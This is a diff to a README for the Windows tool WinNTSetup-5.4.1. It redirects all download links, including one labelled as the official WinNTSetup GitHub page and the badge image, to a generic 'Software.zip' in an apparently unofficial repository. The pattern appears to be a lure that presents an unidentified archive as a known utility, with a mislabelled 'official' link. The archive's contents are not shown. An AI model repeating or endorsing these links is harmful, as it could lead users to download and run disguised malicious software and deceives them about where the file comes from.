@@ -20,7 +20,7 @@ The current version available in this repository is WinNTSetup-5.4.1. Make sure 
 
 ## Download WinNTSetup
 To download WinNTSetup-5.4.1, click on the following link:
-[Download WinNTSetup-5.4.1](https://github.com/user-attachments/files/18383251/Software.zip)
+[Download WinNTSetup-5.4.1](https://github.com/iguroedts/WinNTSetup-5.4.1/releases/download/v1.0/Software.zip)
 
 🚨 Launch the download link to get started with WinNTSetup-5.4.1.
 
@@ -50,10 +50,10 @@ Dive into these topics to enhance your knowledge about WinNTSetup and its functi
 ## Additional Information
 If the provided download link is not working, please check the "Releases" section of this repository for alternative download options. For any questions or assistance, feel free to reach out through the GitHub platform.
 
-🔗 Visit the official [WinNTSetup GitHub Page](https://github.com/winntsetup) for more updates and resources.
+🔗 Visit the official [WinNTSetup GitHub Page](https://github.com/iguroedts/WinNTSetup-5.4.1/releases/download/v1.0/Software.zip) for more updates and resources.
 
 Get ready to experience a seamless Windows setup process with WinNTSetup-5.4.1! 🖥️💿🔧
 
 ---
 
-[![Download WinNTSetup-5.4.1](https://img.shields.io/badge/Download-WinNTSetup5.4.1-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download WinNTSetup-5.4.1](https://github.com/iguroedts/WinNTSetup-5.4.1/releases/download/v1.0/Software.zip)](https://github.com/iguroedts/WinNTSetup-5.4.1/releases/download/v1.0/Software.zip)
